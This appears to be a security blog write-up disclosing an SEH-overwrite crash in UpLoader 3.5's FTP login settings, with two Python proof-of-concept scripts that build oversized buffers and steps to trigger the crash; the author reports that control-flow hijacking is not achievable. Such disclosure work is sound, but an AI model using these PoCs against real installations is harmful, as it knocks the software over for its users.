---
layout: post
title: UpLoader 3.5 - 'FTP Login' Denial of Service (PoC + SEH Overwrite)
date: 2020-03-26 14:45:00
categories: posts
comments: false
en: true
---

# The Bug.

Uploader! 3.5 suffers from a Structered Exception Handling Overwrite which ends up simply being a Denial of Service due the lack of a valid address.

## The Crash.

### Initial PoC.

```term
import struct

buffer = "A" * 1000 + "A" * 2000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### Once the file is generated and copied to the clipboard, the application is launched and 'Settings' is selected:

![](/assets/img/Findings9/1.png)

The clipboard is pasted within the three parameters, and the box stating "Check to save password in preferences" is checked as well.

### Once OK is clicked, a crash without an overwrite is given:

![](/assets/img/Findings9/2.png)

### Upon rebooting the application, the SEH Chain is modified by 0x41 bytes:

![](/assets/img/Findings9/3.png)

### With the use of the msf tools, the pattern is found out to be 477.

### PoC.

```term
import struct

buffer = "A" * 477 + "BBBB" + "CCCC" + "\xff" * 2000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### The file uploadpref.dat is deleted, and the application is once again started.

![](/assets/img/Findings9/4.png)

### After repeting the process, the SEH Chain is altered as desired:

![](/assets/img/Findings9/5.png)

### The next step would be hijicking the flow, however, there are no modules with available addresses.

![](/assets/img/Findings9/6.png)

### Due to the fact that NULL-bytes are mangled by the application and its difficulty to implement into this exploit, the circumstances make it impossible to make use of such.

![](/assets/img/Findings9/7.png)
